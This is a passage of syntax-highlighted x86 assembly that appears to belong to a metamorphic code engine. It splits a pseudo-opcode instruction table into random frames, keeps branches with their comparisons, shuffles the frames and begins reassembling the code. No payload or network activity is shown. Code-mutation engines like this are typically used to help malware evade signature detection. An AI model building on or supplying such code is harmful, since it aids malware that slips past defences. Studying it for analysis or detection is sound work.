                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfJumps</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Initialize this</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FramesTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InstructionTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Number of instructions * 10h</span><span class="sc0">

       </span><span class="sc5">@@NextFrame</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">     </span><span class="sc1">; Get a random number between F0h and 1E0h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">; Set the beginning of the first frame</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">; Set the end as beginning+the random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">@@LoopCheckInst00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">    </span><span class="sc1">; Get the last instruction</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; If we meet the first instruction, stop</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CheckInst_Next00</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the pseudoopcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">         </span><span class="sc1">; Is it NOP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LoopCheckInst00</span><span class="sc0">   </span><span class="sc1">; Then decrease again (ignore it)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">         </span><span class="sc1">; API CALL?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@CheckInst_Next00</span><span class="sc0">  </span><span class="sc1">; If not, finish</span><span class="sc0">
    </span><span class="sc5">@@LoopCheckInst01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">; Get the next address</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; If it's the last</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CheckInst_Next00</span><span class="sc0">                 </span><span class="sc1">; instruction, finish</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get the opcopde</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">         </span><span class="sc1">; NOP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LoopCheckInst01</span><span class="sc0">   </span><span class="sc1">; If NOP, loop again</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">         </span><span class="sc1">; Check for APICALL_STORE</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@CheckInst_Next00</span><span class="sc0">  </span><span class="sc1">; If it isn't, continue</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">; Include APICALL_STORE in the frame</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">@@CheckInst_Next00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">          </span><span class="sc1">; Get the address of the last</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@DontAdd10hYet</span><span class="sc0">     </span><span class="sc1">; instruction of the frame and jump</span><span class="sc0">
    </span><span class="sc5">@@LoopCheckInst02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">; Next instruction</span><span class="sc0">
    </span><span class="sc5">@@DontAdd10hYet</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; If it's the last</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CheckInst_Next01</span><span class="sc0">           </span><span class="sc1">; instruction, finish loop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">         </span><span class="sc1">; NOP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LoopCheckInst02</span><span class="sc0">   </span><span class="sc1">; If NOP, get the next instruction</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">         </span><span class="sc1">; JMP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CheckInst_IncludeInstruction</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">         </span><span class="sc1">; RET?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CheckInst_IncludeInstruction</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">         </span><span class="sc1">; JMP Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CheckInst_IncludeInstruction</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDh</span><span class="sc0">         </span><span class="sc1">; JMP Reg?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CheckInst_IncludeInstruction</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">          </span><span class="sc1">; Jcc?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@CheckInst_Next01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@CheckInst_Next01</span><span class="sc0">

  </span><span class="sc1">;; Include the next instructions in the same frame:</span><span class="sc0">
  </span><span class="sc1">;; JMP: Include it to avoid strange situations where Jcc + JMP cannot be</span><span class="sc0">
  </span><span class="sc1">;;     compressed and then never eliminated (or something like that)</span><span class="sc0">
  </span><span class="sc1">;;     (3D problems :)</span><span class="sc0">
  </span><span class="sc1">;; RET: The same: we avoid situations where a single RET is pointed by a</span><span class="sc0">
  </span><span class="sc1">;;     jump.</span><span class="sc0">
  </span><span class="sc1">;; JMP Mem: Same as RET.</span><span class="sc0">
  </span><span class="sc1">;; JMP Reg: Same as RET.</span><span class="sc0">
  </span><span class="sc1">;; Jcc: To avoid unlinking it from its CMP/TEST from before, and then making</span><span class="sc0">
  </span><span class="sc1">;;     the shrinker to eliminate a single CMP/TEST.</span><span class="sc0">

    </span><span class="sc5">@@CheckInst_IncludeInstruction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">  </span><span class="sc1">; Add instructions to the frame until all</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">       </span><span class="sc1">; the conflictive instructions are inserted</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">  </span><span class="sc1">; in the same frame. The others don't</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">; matter if they are wherever we want.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@DontAdd10hYet</span><span class="sc0">
    </span><span class="sc5">@@CheckInst_Next01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">     </span><span class="sc1">; Increase the frame pointer</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01E0h</span><span class="sc0"> </span><span class="sc1">; Are we inside our last instructions?</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@NextFrame</span><span class="sc0">  </span><span class="sc1">; If we aren't, generate another</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">; If we have arrived until the last</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@FramesCreationFinished</span><span class="sc0">  </span><span class="sc1">; instruction, it's finished.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">           </span><span class="sc1">; Insert the instruction of this</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; frame and the last instruction.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc5">@@FramesCreationFinished</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastFrame</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Set the last frame.</span><span class="sc0">
    </span><span class="sc5">@@TempLabel</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">;; Calculate MOD</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">               </span><span class="sc1">; Get a value we can use for</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FramesTable</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; mask a random number. The</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">               </span><span class="sc1">; value is got from the total</span><span class="sc0">
                </span><span class="sc1">; EAX = Number of frames * 8   ; number of frames.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc5">@@LoopCalculateMOD</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@LoopCalculateMOD</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MODValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

     </span><span class="sc1">;; Now we have frames that we can permutate. We save the address of</span><span class="sc0">
     </span><span class="sc1">;; the first frame to know where to jump when the code is reassembled</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FramesTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PositionOfFirstInstruction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

     </span><span class="sc1">;; The frames are permutated. We have taken in account the first</span><span class="sc0">
     </span><span class="sc1">;; instruction and we save everytime the address where the first</span><span class="sc0">
     </span><span class="sc1">;; instruction is.</span><span class="sc0">
     </span><span class="sc1">;; ESI = Table of frames</span><span class="sc0">
     </span><span class="sc1">;; EDI = Address of last frame</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc5">@@LoopExchange</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MODValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">; Get frame in EAX</span><span class="sc0">

</span><span class="sc1">; ; Uncommenting this instruction the engine doesn't permutate anything</span><span class="sc0">
</span><span class="sc1">; ; (used to avoid getting crazy while finding bugs in regenerated codes)</span><span class="sc0">
</span><span class="sc1">;                mov     eax, edx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">; Frame address &gt; last frame address?</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@LoopExchange</span><span class="sc0"> </span><span class="sc1">; If so, get other random frame</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Exchange frame at EDX with the random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; frame got above.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">; Be aware of first instruction position!</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PositionOfFirstInstruction</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LookEAX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PositionOfFirstInstruction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ExchangeNext</span><span class="sc0">
         </span><span class="sc5">@@LookEAX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PositionOfFirstInstruction</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ExchangeNext</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PositionOfFirstInstruction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc5">@@ExchangeNext</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Exchange frame</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; Next frame</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">; Last frame?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@LoopExchange</span><span class="sc0"> </span><span class="sc1">; If not, exchange next</span><span class="sc0">

        </span><span class="sc1">;; Now we are going to copy the instructions and update the label</span><span class="sc0">
        </span><span class="sc1">;; addresses in the label table. We include NOPs because they can</span><span class="sc0">
        </span><span class="sc1">;; have a label over them, and if we eliminate them the label</span><span class="sc0">
        </span><span class="sc1">;; updating will be problematic.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InstructionTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PermutationResult</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FramesTable</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PositionOfFirstInstruction</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@InsertJump2</span><span class="sc0">
      </span><span class="sc5">@@LoopCopyFrame</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Permut_LastInstruction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get the start and end address of the</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">          </span><span class="sc1">; frame and copy the instructions.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
      </span><span class="sc5">@@LoopCopyInstructions</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">         </span><span class="sc1">; If we find a remaining pseudoopcode</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0"> </span><span class="sc1">; 4F from the shrinking part, we</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc0">         </span><span class="sc1">; substitute it by the correct one:</span><span class="sc0">
